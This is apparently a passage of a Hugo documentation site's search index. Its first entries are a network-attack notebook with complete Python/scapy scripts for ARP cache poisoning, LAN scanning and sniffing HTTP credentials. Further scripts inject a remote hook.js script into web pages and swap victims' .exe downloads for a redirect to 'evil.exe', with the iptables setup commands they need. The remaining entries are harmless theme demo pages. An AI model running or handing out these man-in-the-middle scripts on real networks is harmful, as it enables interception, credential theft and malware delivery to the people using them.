src=\u0026#34;http://192.168.178.18:3000/hook.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\u0026#39; load = scapy_packet[scapy.Raw].load.replace(\u0026#39;\u0026lt;meta property=\u0026#34;og:title\u0026#34; content=\u0026#34;Home\u0026#34;/\u0026gt;\u0026#39;, injection_code) content_length_search = re.search(\u0026#34;(?:Content-Length:\\s)(\\d*)\u0026#34;, load) if content_length_search and \u0026#34;text/html\u0026#34; in load: content_length = content_length_search.group(1) new_content_length = int(content_length) + len(injection_code) load = load.replace(content_length, str(new_content_length)) if load != scapy_packet[scapy.Raw].load: new_packet = set_load(scapy_packet, load) packet.set_payload(str(new_packet)) packet.accept() queue = netfilterqueue.NetfilterQueue() queue.bind(0, process_packet) queue.run() ","description":"After we become the [mitm][arp_cache_poisoning] we can modify HTTP responses by changing the Raw data on the fly.\n[arp_cache_poisoning]: https://jwever.bitbucket.io/lan/exploitation/mitm/arp_cache_poisoning/\nSince most clients will request [content encoding][http_compression] (by adding a \u0026ldquo;Accept-Encoding\u0026rdquo; header), the HTTP response data (scapy.Raw layer) will look like gibberish.\nThis is is because the data is GZIPPED most of the time. To get around this we can simply delete this header from the HTTP request!\n[http_compression]: https://en.wikipedia.org/wiki/HTTP_compression"},{"id":25,"href":"/http/credentials_sniffer/","title":"HTTP credentials sniffing","parent":"Http","content":"After we become the mitm we can sniff all HTTP requests. This time using scapy\u0026rsquo;s buildin sniffing function.\nIn the code we are checking for HTTP credentials.\nTo get this code to work you first need to run arp cache poisoning and run this command on attacker machine:\nFull code:\nimport scapy.all as scapy from scapy.layers import http def sniff(interface): scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet) def get_url(packet): return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path def get_login_info(packet): if packet.haslayer(scapy.Raw): load = packet[scapy.Raw].load keywords = [\u0026#34;pwd\u0026#34;] for keyword in keywords: if keyword in load: return load def process_sniffed_packet(packet): if packet.haslayer(http.HTTPRequest): url = get_url(packet) print(\u0026#34;[+] HTTP Request \u0026gt;\u0026gt; \u0026#34; + url) login_info = get_login_info(packet) if login_info: print(\u0026#34;\\n[+] Possible username/password \u0026gt; \u0026#34; + login_info + \u0026#34;\\n\u0026#34;) sniff(\u0026#34;enp7s0\u0026#34;) ","description":"After we become the mitm we can sniff all HTTP requests. This time using scapy\u0026rsquo;s buildin sniffing function.\nIn the code we are checking for HTTP credentials.\nTo get this code to work you first need to run arp cache poisoning and run this command on attacker machine:\nFull code:\nimport scapy.all as scapy from scapy.layers import http def sniff(interface): scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet) def get_url(packet): return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path def get_login_info(packet): if packet."},{"id":26,"href":"/http/replace_download/","title":"Modifying HTTP download response","parent":"Http","content":"After we become the mitm we can modify HTTP responses by changing the Raw data.\nIn this case we check if the victim is downloading a .exe file and we are changing the response from the server so that it includes are own malicious payload.\nWe do check against the destination port (dport) and source port (sport). When a sport is present it is a response, when a dport is present it is a request.\nFor this we need to modify packets on the fly. With scapy alone this is not possible, we need to use NetfilterQueue.\nTo get this code to work you first need to run arp cache poisoning and run this command on attacker machine:\niptables -I FORWARD -j NFQUEUE --queue-num 0 Or without arp spoofing on local machine:\niptables -I OUTPUT -j NFQUEUE --queue-num 0 iptables -I INPUT -j NFQUEUE --queue-num 0 Full code:\n# !/usr/bin/env python import netfilterqueue import scapy.all as scapy ack_list = [] def set_load(packet, load): packet[scapy.Raw].load = load del packet[scapy.IP].len del packet[scapy.IP].chksum del packet[scapy.TCP].chksum return packet def process_packet(packet): scapy_packet = scapy.IP(packet.get_payload()) if scapy_packet.haslayer(scapy.Raw): if scapy_packet[scapy.TCP].dport == 80: if \u0026#34;.exe\u0026#34; in scapy_packet[scapy.Raw].load and \u0026#34;localhost\u0026#34; not in scapy_packet[scapy.Raw].load: print(\u0026#34;[+] exe Request\u0026#34;) # add the TCP - ACK number of the TCP packet (the HTTP request packet) to a seperate list so we can check that # against the TCP - SEQ number in the response ack_list.append(scapy_packet[scapy.TCP].ack) elif scapy_packet[scapy.TCP].sport == 80: # check if response corresponds to a request in our ack list if scapy_packet[scapy.TCP].seq in ack_list: ack_list.remove(scapy_packet[scapy.TCP].seq) print(\u0026#34;[+] Replacing file\u0026#34;) modified_packet = set_load(scapy_packet, # note the trailing newlines \u0026#34;HTTP/1.1 301 Moved Permanently\\nLocation: http://localhost:8000/Downloads/evil.exe\\n\\n\u0026#34;) packet.set_payload(str(modified_packet)) packet.accept() queue = netfilterqueue.NetfilterQueue() queue.bind(0, process_packet) queue.run() ","description":"After we become the mitm we can modify HTTP responses by changing the Raw data.\nIn this case we check if the victim is downloading a .exe file and we are changing the response from the server so that it includes are own malicious payload.\nWe do check against the destination port (dport) and source port (sport). When a sport is present it is a response, when a dport is present it is a request."},{"id":27,"href":"/spoofing/","title":"Spoofing","parent":"Documentation","content":"","description":""},{"id":28,"href":"/arp/arp_cache_poisoning/","title":"Arp cache poisoning","parent":"Arp","content":"With Scapy you can easily send crafted ARP reply packets. The idea is to constantly send the victim ARP replies telling it we are the router.\nWe do the same for the router, we tell it we are the victim machine. After we become the man in the middle we can intercept \u0026amp; inspect all data\u0026hellip;\nTo allow forwarding of packets between the victim and the gateway we need to enable ip_forward:\necho \u0026#39;1\u0026#39; \u0026gt; /proc/sys/net/ipv4/ip_forward The function get_mac sends arp request message (\u0026ldquo;Who has\u0026rdquo;) to the broadcast address, so all clients on the LAN receive it,\nwe will get the correct mac address back from the target_ip.\nNow that we have the correct mac address from the target we can start sending spoofed reply packets with spoof function (\u0026rsquo;target_ip\u0026rsquo; is at \u0026lsquo;attacker mac address\u0026rsquo;)\nand\nThe full code:\n#!/usr/bin/env python import scapy.all as scapy import time import argparse def get_arguments(): parser = argparse.ArgumentParser() parser.add_argument(\u0026#34;-t\u0026#34;, \u0026#34;--target\u0026#34;, dest=\u0026#34;target\u0026#34;, help=\u0026#34;Target IP\u0026#34;) parser.add_argument(\u0026#34;-g\u0026#34;, \u0026#34;--gateway\u0026#34;, dest=\u0026#34;gateway\u0026#34;, help=\u0026#34;Gateway IP\u0026#34;) options = parser.parse_args() return options # Get target mac address using ip address def get_mac(ip): arp_request = scapy.ARP(pdst=ip) broadcast = scapy.Ether(dst=\u0026#34;ff:ff:ff:ff:ff:ff\u0026#34;) arp_request_broadcast = broadcast/arp_request answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0] return answered_list[0][1].hwsrc # Change mac address in arp table def spoof(target_ip, spoof_ip): target_mac = get_mac(target_ip) packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) scapy.send(packet, verbose=False) # Restore mac address in arp table def restore(dest_ip, source_ip): dest_mac = get_mac(dest_ip) source_mac = get_mac(source_ip) packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac) scapy.send(packet, count=4, verbose=False) options = get_arguments() sent_packets_count = 0 try: while True: spoof(options.target, options.gateway) spoof(options.gateway, options.target) sent_packets_count = sent_packets_count + 2 print(\u0026#34;\\r[+] ARP spoofing started - packets sent: \u0026#34; + str(sent_packets_count)) time.sleep(2) except KeyboardInterrupt: print(\u0026#34;\\nCTRL+C pressed .... Reseting ARP tables. Please wait\u0026#34;) restore(options.target, options.gateway) restore(options.gateway, options.target) print(\u0026#34;\\nARP table restored. Quiting\u0026#34;) ","description":"With Scapy you can easily send crafted ARP reply packets. The idea is to constantly send the victim ARP replies telling it we are the router.\nWe do the same for the router, we tell it we are the victim machine. After we become the man in the middle we can intercept \u0026amp; inspect all data\u0026hellip;\nTo allow forwarding of packets between the victim and the gateway we need to enable ip_forward:"},{"id":29,"href":"/arp/arp_scanning/","title":"Network scanning using arp","parent":"Arp","content":"We can scan the LAN by sending an ARP request to the broadcast mac address iterating over every IP we specify.\nWhen a device sends a packet to the broadcast MAC address (FF:FF:FF:FF:FF:FF), it is delivered to all stations on the local network.\nArp request says: \u0026ldquo;who has 192.168.0.10?\u0026rdquo;\nIf a host with ip 192.168.0.10 is online it will reply with an ARP reply message saying: \u0026ldquo;I have 192.168.0.10, my mac address is 00:22:33:44:55:66\u0026rdquo;\nThe arp table on every host contains a list of all the IP address to MAC address mappings.\nimport scapy.all as scapy import argparse def get_arguments(): parser = argparse.ArgumentParser() parser.add_argument(\u0026#34;-t\u0026#34;, \u0026#34;--target\u0026#34;, dest=\u0026#34;target\u0026#34;, help=\u0026#34;Target IP / IP Range\u0026#34;) options = parser.parse_args() if not options.target: parser.error(\u0026#34;[-] Please specify an ip range, use --help for more info.\u0026#34;) return options def scan(ip): arp_req = scapy.ARP(pdst=ip) broadcast = scapy.Ether(dst=\u0026#34;ff:ff:ff:ff:ff:ff\u0026#34;) arp_req_broadcast = broadcast/arp_req answered_list = scapy.srp(arp_req_broadcast, timeout=1, verbose=False)[0] clients_list = [] # creating a list[] of dictionaries {} for element in answered_list: client_dict = {\u0026#34;ip\u0026#34;: element[1].psrc, \u0026#34;mac\u0026#34;: element[1].hwsrc} clients_list.append(client_dict) return clients_list def print_result(results_list): print(\u0026#34;IP\\t\\t\\tMAC ADRESS\\n------------------------------------------\u0026#34;) for client in results_list: print(client[\u0026#34;ip\u0026#34;] + \u0026#34;\\t\\t\u0026#34; + client[\u0026#34;mac\u0026#34;]) options = get_arguments() scan_result = scan(options.target) print_result(scan_result) ","description":"We can scan the LAN by sending an ARP request to the broadcast mac address iterating over every IP we specify.\nWhen a device sends a packet to the broadcast MAC address (FF:FF:FF:FF:FF:FF), it is delivered to all stations on the local network.\nArp request says: \u0026ldquo;who has 192.168.0.10?\u0026rdquo;\nIf a host with ip 192.168.0.10 is online it will reply with an ARP reply message saying: \u0026ldquo;I have 192.168.0.10, my mac address is 00:22:33:44:55:66\u0026rdquo;"},{"id":30,"href":"/collapse/level-1/","title":"Level 1","parent":"Collapse","content":"Level 1\nLevel 1.1 Level 1.2 ","description":"Level 1\nLevel 1.1 Level 1.2 "},{"id":31,"href":"/collapse/level-2/","title":"Level 2","parent":"Collapse","content":"Level-2\n","description":"Level-2"},{"id":32,"href":"/shortcodes/buttons/","title":"Buttons","parent":"Shortcodes","content":"Buttons are styled links that can lead to local page or external link.\n{{\u0026lt; button relref=\u0026#34;/\u0026#34; [class=\u0026#34;...\u0026#34;] \u0026gt;}}Get Home{{\u0026lt; /button \u0026gt;}} {{\u0026lt; button href=\u0026#34;https://github.com/thegeeklab/hugo-geekdoc\u0026#34; \u0026gt;}}Contribute{{\u0026lt; /button \u0026gt;}} Example Get Home Contribute ","description":"Buttons are styled links that can lead to local page or external link.\n{{\u0026lt; button relref=\u0026#34;/\u0026#34; [class=\u0026#34;...\u0026#34;] \u0026gt;}}Get Home{{\u0026lt; /button \u0026gt;}} {{\u0026lt; button href=\u0026#34;https://github.com/thegeeklab/hugo-geekdoc\u0026#34; \u0026gt;}}Contribute{{\u0026lt; /button \u0026gt;}} Example Get Home Contribute "},{"id":33,"href":"/shortcodes/columns/","title":"Columns","parent":"Shortcodes","content":"Columns help organize shorter pieces of content horizontally for readability.\n{{\u0026lt; columns \u0026gt;}} \u0026lt;!-- begin columns block --\u0026gt; # Left Content Dolor sit, sumo unique argument um no ... \u0026lt;---\u0026gt; \u0026lt;!-- magic sparator, between columns --\u0026gt; # Mid Content Dolor sit, sumo unique argument um no ... \u0026lt;---\u0026gt; \u0026lt;!-- magic sparator, between columns --\u0026gt; # Right Content Dolor sit, sumo unique argument um no ... {{\u0026lt; /columns \u0026gt;}} Example Left Dolor sit, sumo unique argument um no. Gracie nominal id xiv. Romanesque acclimates investiture. Ornateness bland it ex enc, est yeti am bongo detract re. Pro ad prompts feud gait, quid exercise emeritus bis e. In pro quints consequent, denim fastidious copious quo ad. Stet probates in duo. Mid Content Dolor sit, sumo unique argument um no. Gracie nominal id xiv. Romanesque acclimates investiture. Ornateness bland it ex enc, est yeti am bongo detract re. Right Content Dolor sit, sumo unique argument um no. Gracie nominal id xiv. Romanesque acclimates investiture. Ornateness bland it ex enc, est yeti am bongo detract re. Pro ad prompts feud gait, quid exercise emeritus bis e. In pro quints consequent, denim fastidious copious quo ad. Stet probates in duo. ","description":"Columns help organize shorter pieces of content horizontally for readability.\n{{\u0026lt; columns \u0026gt;}} \u0026lt;!-- begin columns block --\u0026gt; # Left Content Dolor sit, sumo unique argument um no ... \u0026lt;---\u0026gt; \u0026lt;!-- magic sparator, between columns --\u0026gt; # Mid Content Dolor sit, sumo unique argument um no ... \u0026lt;---\u0026gt; \u0026lt;!-- magic sparator, between columns --\u0026gt; # Right Content Dolor sit, sumo unique argument um no ... {{\u0026lt; /columns \u0026gt;}} Example Left Dolor sit, sumo unique argument um no."},{"id":34,"href":"/shortcodes/expand/","title":"Expand","parent":"Shortcodes","content":"Expand shortcode can help to decrease clutter on screen by hiding part of text. Expand content by clicking on it.\nExample Default {{\u0026lt; expand \u0026gt;}} ## Markdown content Dolor sit, sumo unique ... {{\u0026lt; /expand \u0026gt;}} Expand ↕ Markdown content Dolor sit, sumo unique argument um no. Gracie nominal id xiv. Romanesque acclimates investiture. Ornateness bland it ex enc, est yeti am bongo detract re. With Custom Label {{\u0026lt; expand \u0026#34;Custom Label\u0026#34; \u0026#34;...\u0026#34; \u0026gt;}} ## Markdown content Dolor sit, sumo unique ... {{\u0026lt; /expand \u0026gt;}} Custom Label ... More markdown Dolor sit, sumo unique argument um no. Gracie nominal id xiv. Romanesque acclimates investiture. Ornateness bland it ex enc, est yeti am bongo detract re. Pro ad prompts feud gait, quid exercise emeritus bis e. In pro quints consequent, denim fastidious copious quo ad. Stet probates in duo. ","description":"Expand shortcode can help to decrease clutter on screen by hiding part of text. Expand content by clicking on it.\nExample Default {{\u0026lt; expand \u0026gt;}} ## Markdown content Dolor sit, sumo unique ... {{\u0026lt; /expand \u0026gt;}} Expand ↕ Markdown content Dolor sit, sumo unique argument um no. Gracie nominal id xiv. Romanesque acclimates investiture. Ornateness bland it ex enc, est yeti am bongo detract re. With Custom Label {{\u0026lt; expand \u0026#34;Custom Label\u0026#34; \u0026#34;."},{"id":35,"href":"/shortcodes/hints/","title":"Hints","parent":"Shortcodes","content":"Hint shortcode can be used as hint/alerts/notification block. There are four colors to choose: info, ok, warning and danger.\n{{\u0026lt; hint [info|warning|danger] \u0026gt;}} **Markdown content**\\ Dolor sit, sumo unique argument um no. Gracie nominal id xiv. Romanesque acclimates investiture. Ornateness bland it ex enc, est yeti am bongo detract re. {{\u0026lt; /hint \u0026gt;}} Example Markdown content\nDolor sit, sumo unique argument um no. Gracie nominal id xiv. Romanesque acclimates investiture. Ornateness bland it ex enc, est yeti am bongo detract re. Markdown content\nDolor sit, sumo unique argument um no. Gracie nominal id xiv. Romanesque acclimates investiture. Ornateness bland it ex enc, est yeti am bongo detract re. Markdown content\nDolor sit, sumo unique argument um no. Gracie nominal id xiv. Romanesque acclimates investiture. Ornateness bland it ex enc, est yeti am bongo detract re. Markdown content\nDolor sit, sumo unique argument um no. Gracie nominal id xiv. Romanesque acclimates investiture. Ornateness bland it ex enc, est yeti am bongo detract re. ","description":"Hint shortcode can be used as hint/alerts/notification block. There are four colors to choose: info, ok, warning and danger.\n{{\u0026lt; hint [info|warning|danger] \u0026gt;}} **Markdown content**\\ Dolor sit, sumo unique argument um no. Gracie nominal id xiv. Romanesque acclimates investiture. Ornateness bland it ex enc, est yeti am bongo detract re. {{\u0026lt; /hint \u0026gt;}} Example Markdown content\nDolor sit, sumo unique argument um no. Gracie nominal id xiv. Romanesque acclimates investiture. Ornateness bland it ex enc, est yeti am bongo detract re."},{"id":36,"href":"/shortcodes/includes/","title":"Includes","parent":"Shortcodes","content":"Include shortcode can include files of different types. By specifying a language, the included file will have syntax highlighting.\nShortcode {{\u0026lt; include file=\u0026#34;relative/path/from/hugo/root\u0026#34; language=\u0026#34;go\u0026#34; markdown=[false|true] \u0026gt;}} Attributes:\nName Usage default file path to the included file relative to the hugo root empty value language* language for syntax highlighting empty value markdown included file is markdown false options highlighting options linenos=table * if not set, the content will be rendered as plain HTML\nInclude *.yml file with options {{\u0026lt; include file=\u0026#34;config.yaml\u0026#34; language=\u0026#34;yaml\u0026#34; options=\u0026#34;linenos=table,hl_lines=5-6,linenostart=100\u0026#34; \u0026gt;}} Include *.md file Included markdown files will be rendered using the markdownify filter.\nLocation of markdown files\nIf you include markdown files that should not get a menu entry, place them outside the content folder or exclude them otherwise. {{\u0026lt; include file=\u0026#34;static/includes/table.md.part\u0026#34; markdown=\u0026#34;true\u0026#34; \u0026gt;}} Test Table Head 1 Head 2 Head 3 1 2 3 Include *.html file HTML content will be filtered by the safeHTML filter and added to the rendered page output.\n{{\u0026lt; include file=\u0026#34;static/includes/example.html.part\u0026#34; \u0026gt;}} This is heading 1 This is heading 2 This is heading 3 This is heading 4 This is heading 5 This is heading 6 ","description":"Include shortcode can include files of different types. By specifying a language, the included file will have syntax highlighting.\nShortcode {{\u0026lt; include file=\u0026#34;relative/path/from/hugo/root\u0026#34; language=\u0026#34;go\u0026#34; markdown=[false|true] \u0026gt;}} Attributes:\nName Usage default file path to the included file relative to the hugo root empty value language* language for syntax highlighting empty value markdown included file is markdown false options highlighting options linenos=table * if not set, the content will be rendered as plain HTML"},{"id":37,"href":"/shortcodes/mermaid/","title":"Mermaid","parent":"Shortcodes","content":"Mermaid is library for generating SVG charts and diagrams from text.\nExample sequenceDiagram Alice-\u003e\u003eBob: Hello Bob, how are you? alt is sick Bob-\u003e\u003eAlice: Not so good :( else is well Bob-\u003e\u003eAlice: Feeling fresh like a daisy end opt Extra response Bob-\u003e\u003eAlice: Thanks for asking end sequenceDiagram Alice-\u003e\u003eBob: Hello Bob, how are you? alt is sick Bob-\u003e\u003eAlice: Not so good :( else is well Bob-\u003e\u003eAlice: Feeling fresh like a daisy end opt Extra response Bob-\u003e\u003eAlice: Thanks for asking end ","description":"Mermaid is library for generating SVG charts and diagrams from text. Example sequenceDiagram Alice-\u003e\u003eBob: Hello Bob, how are you? alt is sick Bob-\u003e\u003eAlice: Not so good :( else is well Bob-\u003e\u003eAlice: Feeling fresh like a daisy end opt Extra response Bob-\u003e\u003eAlice: Thanks for asking end sequenceDiagram Alice-\u003e\u003eBob: Hello Bob, how are you? alt is sick Bob-\u003e\u003eAlice: Not so good :( else is well Bob-\u003e\u003eAlice: Feeling fresh like a daisy end opt Extra response Bob-\u003e\u003eAlice: Thanks for asking end "},{"id":38,"href":"/shortcodes/tabs/","title":"Tabs","parent":"Shortcodes","content":"Tabs let you organize content by context, for example installation instructions for each supported platform.\n{{\u0026lt; tabs \u0026#34;uniqueid\u0026#34; \u0026gt;}} {{\u0026lt; tab \u0026#34;macOS\u0026#34; \u0026gt;}} # macOS Content {{\u0026lt; /tab \u0026gt;}} {{\u0026lt; tab \u0026#34;Linux\u0026#34; \u0026gt;}} # Linux Content {{\u0026lt; /tab \u0026gt;}} {{\u0026lt; tab \u0026#34;Windows\u0026#34; \u0026gt;}} # Windows Content {{\u0026lt; /tab \u0026gt;}} {{\u0026lt; /tabs \u0026gt;}} Example macOS macOS This is tab macOS content.\nDolor sit, sumo unique argument um no. Gracie nominal id xiv. Romanesque acclimates investiture. Ornateness bland it ex enc, est yeti am bongo detract re. Pro ad prompts feud gait, quid exercise emeritus bis e. In pro quints consequent, denim fastidious copious quo ad. Stet probates in duo.\nLinux Linux This is tab Linux content.\nDolor sit, sumo unique argument um no. Gracie nominal id xiv. Romanesque acclimates investiture. Ornateness bland it ex enc, est yeti am bongo detract re. Pro ad prompts feud gait, quid exercise emeritus bis e. In pro quints consequent, denim fastidious copious quo ad. Stet probates in duo.\nWindows Windows This is tab Windows content.\nDolor sit, sumo unique argument um no. Gracie nominal id xiv. Romanesque acclimates investiture. Ornateness bland it ex enc, est yeti am bongo detract re. Pro ad prompts feud gait, quid exercise emeritus bis e. In pro quints consequent.\n","description":"Tabs let you organize content by context, for example installation instructions for each supported platform.\n{{\u0026lt; tabs \u0026#34;uniqueid\u0026#34; \u0026gt;}} {{\u0026lt; tab \u0026#34;macOS\u0026#34; \u0026gt;}} # macOS Content {{\u0026lt; /tab \u0026gt;}} {{\u0026lt; tab \u0026#34;Linux\u0026#34; \u0026gt;}} # Linux Content {{\u0026lt; /tab \u0026gt;}} {{\u0026lt; tab \u0026#34;Windows\u0026#34; \u0026gt;}} # Windows Content {{\u0026lt; /tab \u0026gt;}} {{\u0026lt; /tabs \u0026gt;}} Example macOS macOS This is tab macOS content.\nDolor sit, sumo unique argument um no. Gracie nominal id xiv."},{"id":39,"href":"/shortcodes/toc-tree/","title":"Toc Tree","parent":"Shortcodes","content":"The toc-tree shortcode will generate a Table of Content from a section file tree of your content directory. The root of the resulting ToC will be the page on which you define the shortcode.\n{{\u0026lt; toc-tree \u0026gt;}} Example As said, the root will be the site on which the shortcode was used, you can see a demo including nesting in the ToC Tree section.\n","description":"The toc-tree shortcode will generate a Table of Content from a section file tree of your content directory. The root of the resulting ToC will be the page on which you define the shortcode.\n{{\u0026lt; toc-tree \u0026gt;}} Example As said, the root will be the site on which the shortcode was used, you can see a demo including nesting in the ToC Tree section."},{"id":40,"href":"/shortcodes/toc/","title":"Toc","parent":"Shortcodes","content":"Simple wrapper to generate a page Table of Content from a shortcode.\n{{\u0026lt; toc \u0026gt;}} Level 1 Level 2 Level 2.1 Level 2.1.1 Level 2.1.1.1 Level 2.1.1.1.1 Level 2.2 Level 1 Dolor sit, sumo unique argument um no. Gracie nominal id xiv. Romanesque acclimates investiture. Ornateness bland it ex enc, est yeti am bongo detract re. Pro ad prompts feud gait, quid exercise emeritus bis e. In pro quints consequent, denim fastidious copious quo ad. Stet probates in duo.\nLevel 2 Amalia id per in minimum facility, quid facet modifier ea ma. Ill um select ma ad, en ferric patine sentient vim. Per expendable foreordained interpretations cu, maxim sole pertinacity in ram.\nLevel 2.1 Amalia id per in minimum facility, quid facet modifier ea ma. Ill um select ma ad, en ferric patine sentient vim. Per expendable foreordained interpretations cu, maxim sole pertinacity in ram.\nLevel 2.1.1 Amalia id per in minimum facility, quid facet modifier ea ma. Ill um select ma ad, en ferric patine sentient vim.\nLevel 2.1.1.1 In pro quints consequent, denim fastidious copious quo ad.\nLevel 2.1.1.1.1 In pro quints consequent, denim fastidious copious quo ad.\nLevel 2.2 Dolor sit, sumo unique argument um no. Gracie nominal id xiv. Romanesque acclimates investiture. Ornateness bland it ex enc, est yeti am bongo detract re. Pro ad prompts feud gait, quid exercise emeritus bis e.\nAmalia id per in minimum facility, quid facet modifier ea ma. Ill um select ma ad, en ferric patine sentient vim. Per expendable foreordained interpretations cu, maxim sole pertinacity in ram.\n","description":"Simple wrapper to generate a page Table of Content from a shortcode.\n{{\u0026lt; toc \u0026gt;}} Level 1 Level 2 Level 2.1 Level 2.1.1 Level 2.1.1.1 Level 2.1.1.1.1 Level 2.2 Level 1 Dolor sit, sumo unique argument um no. Gracie nominal id xiv. Romanesque acclimates investiture. Ornateness bland it ex enc, est yeti am bongo detract re. Pro ad prompts feud gait, quid exercise emeritus bis e. In pro quints consequent, denim fastidious copious quo ad."},{"id":41,"href":"/toc-tree/level-1/","title":"Level 1","parent":"ToC Tree","content":"Level 1\nLevel 1.1 Level 1.2 Level 1.3 Level 1.3.1 ","description":"Level 1\nLevel 1.1 Level 1.2 Level 1.3 Level 1.3.1 "},{"id":42,"href":"/toc-tree/level-2/","title":"Level 2","parent":"ToC Tree","content":"Level-2\n","description":"Level-2"},{"id":43,"href":"/usage/code-blocks/","title":"Code Blocks","parent":"Usage","content":"There are multiple ways to add code blocks. Most of them works out of the box only the Hugo shortcode \u0026lt;highlight\u0026gt; need some configuration to work properly.\nInline code Code blocks Highlight shortcode Inline code To display an inline shortcode use single quotes:\n`some code` Example: some code\nCode blocks Code blocks can be uses without language specification:\n``` some code ``` Example:\nsome code \u0026hellip; or if you need language specific syntax highlighting:\n```Shell # some code echo \u0026#34;Hello world\u0026#34; ``` Example:\n# some code echo \u0026#34;Hello World\u0026#34; Highlight shortcode Hugo has a build-in shortcode for syntax highlighting. To work properly with this theme, you have to set following options in your site configuration:\nTOML pygmentsUseClasses=true pygmentsCodeFences=true YAML pygmentsUseClasses: true pygmentsCodeFences: true You can use it like every other shortcode:\n{{\u0026lt; highlight Shell \u0026#34;linenos=table\u0026#34; \u0026gt;}} # some code echo \u0026#34;Hello World\u0026#34; {{\u0026lt; /highlight \u0026gt;}} Example:\n1 2 # some code echo \u0026#34;Hello World\u0026#34; ","description":"There are multiple ways to add code blocks. Most of them works out of the box only the Hugo shortcode \u0026lt;highlight\u0026gt; need some configuration to work properly.\nInline code Code blocks Highlight shortcode Inline code To display an inline shortcode use single quotes:\n`some code` Example: some code\nCode blocks Code blocks can be uses without language specification:\n``` some code ``` Example:\nsome code \u0026hellip; or if you need language specific syntax highlighting:"},{"id":44,"href":"/usage/color-schemes/","title":"Color Schemes","parent":"Usage","content":"If you want to customize the color scheme of the theme to give it your individual touch you are just a few lines CSS away. In general, you have to override the defaults, the easiest way to do so is to create a static/custom.css file right in your site root.\nAll necessary class names are listed below. If you miss some classes required for a color scheme you are very welcome to create an Issue or Pull Request. For some inspiration you can have a look at https://www.color-hex.com/color-palettes/. The following listing use the HC-primary color palette as an example:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 /* default link color */ a { color: #1c388e; } a:visited { color: #73bfb8 } /* site header */ .gdoc-header { background: #e66a4e; border-color: #404040; } .gdoc-header__link, .gdoc-header__link:visited { color: #ffffff; } /* page links */ .gdoc-page__footer a, .gdoc-page__footer a:visited { color: #1c388e; } .gdoc-page__header a, .gdoc-page__header a:visited { color: #1c388e; } /* site footer */ .gdoc-footer { background: #404040; color: #ffffff; } .gdoc-footer__link{ color: #fecf50; } .gdoc-footer__link:visited, .gdoc-footer__link:hover { color: #fecf50; } /* custom shortcodes */ /* button */ .gdoc-button { color: #495057; } .gdoc-button:hover { background-color: #eb8771; border-color: #e66a4e; color: #ffffff; } /* hint */ .gdoc-hint.info { background: #d1d7e8; border-color: #324b99; color: black; } .gdoc-hint.warning { background: #fef5dc; border-color: #e4ba48; color: black; } .gdoc-hint.danger { background: #fae1db; border-color: #cf5f46; color: black; } And that is how the result will looks like. Happy customizing!\n","description":"If you want to customize the color scheme of the theme to give it your individual touch you are just a few lines CSS away. In general, you have to override the defaults, the easiest way to do so is to create a static/custom.css file right in your site root.\nAll necessary class names are listed below. If you miss some classes required for a color scheme you are very welcome to create an Issue or Pull Request."},{"id":45,"href":"/usage/menus/","title":"Menus","parent":"Usage","content":"The theme supports two different kinds of menus. File-tree menu is the default one and does not require further configuration to work. If you want full control about your menu the bundle menu is a powerful option to accomplish it.\nFile-tree menu Bundle menu More menu File-tree menu As the name already suggests, the file tree menu builds a menu from the file system structure of the content folder. By default, areas and subareas are sorted alphabetically by the title of the pages. To manipulate the order the weight parameter in a page front matter can be used. To structure your content folder you have to use page bundles, single files are not supported. Hugo will render build single files in the content folder just fine but it will not be added to the menu.\nExample:\nFile system structure:\ncontent/ ├── level-1 │ ├── _index.md │ ├── level-1-1.md │ ├── level-1-2.md │ └── level-1-3 │ ├── _index.md │ └── level-1-3-1.md └── level-2 ├── _index.md ├── level-2-1.md └── level-2-2.md Bundle menu This type of navigation needs to be enabled first by setting geekdocMenuBundle to true in your site configuration. After you have activated the bundle menu, you start with an empty navigation. This is intentional because bundle menus have to be defined manually in a data file. While this increases the effort it also offers maximum flexibility in the design. The data file needs to be written in YAML and placed at data/menu/main.yml.\nExample:\n--- main: - name: Level 1 ref: \u0026#34;/level-1\u0026#34; icon: \u0026#34;notification\u0026#34; sub: - name: Level 1.1 ref: \u0026#34;/level-1/level-1-1\u0026#34; - name: Level 1.2 ref: \u0026#34;/level-1/level-1-2\u0026#34; - name: Level 1.3 ref: \u0026#34;/level-1/level-1-3\u0026#34; sub: - name: Level 1.3.1 ref: \u0026#34;/level-1/level-1-3/level-1-3-1\u0026#34; - name: Level 2 ref: \u0026#34;/level-2\u0026#34; sub: - name: Level 2.1 ref: \u0026#34;/level-2/level-2-1\u0026#34; - name: Level 2.2 ref: \u0026#34;/level-2/level-2-2\u0026#34; As an advantage you can add icons to your menu entries e.g. icon: \u0026quot;notification\u0026quot;.\nMore menu Tip\nThe more menu is special type of the bundle menu and can be combined with the default file-tree menu. As this is a special type of the bundle menu it is basically working in the same way. To enable it just add a data file to data/menu/more.yml. The more menu will also work with the file-tree menu and therefor don\u0026rsquo;t need to be enabled by the geekdocMenuBundle parameter.\nExample:\n--- more: - name: News ref: \u0026#34;/#\u0026#34; icon: \u0026#34;notification\u0026#34; - name: Releases ref: \u0026#34;https://github.com/thegeeklab/hugo-geekdoc/releases\u0026#34; external: true icon: \u0026#34;download\u0026#34; - name: \u0026#34;View Source\u0026#34; ref: \u0026#34;https://github.com/thegeeklab/hugo-geekdoc\u0026#34; external: true icon: \u0026#34;github\u0026#34; ","description":"The theme supports two different kinds of menus. File-tree menu is the default one and does not require further configuration to work. If you want full control about your menu the bundle menu is a powerful option to accomplish it.\nFile-tree menu Bundle menu More menu File-tree menu As the name already suggests, the file tree menu builds a menu from the file system structure of the content folder. By default, areas and subareas are sorted alphabetically by the title of the pages."},{"id":46,"href":"/collapse/","title":"Collapse","parent":"Documentation","content":"Demo collapsible menu entries.\n","description":"Demo collapsible menu entries."},{"id":47,"href":"/docs/","title":"Docs","parent":"Documentation","content":"","description":""},{"id":48,"href":"/collapse/level-1/level-1-1/","title":"Level 1.1","parent":"Level 1","content":"Level 1.1\n","description":"Level 1.1"},{"id":49,"href":"/toc-tree/level-1/level-1-1/","title":"Level 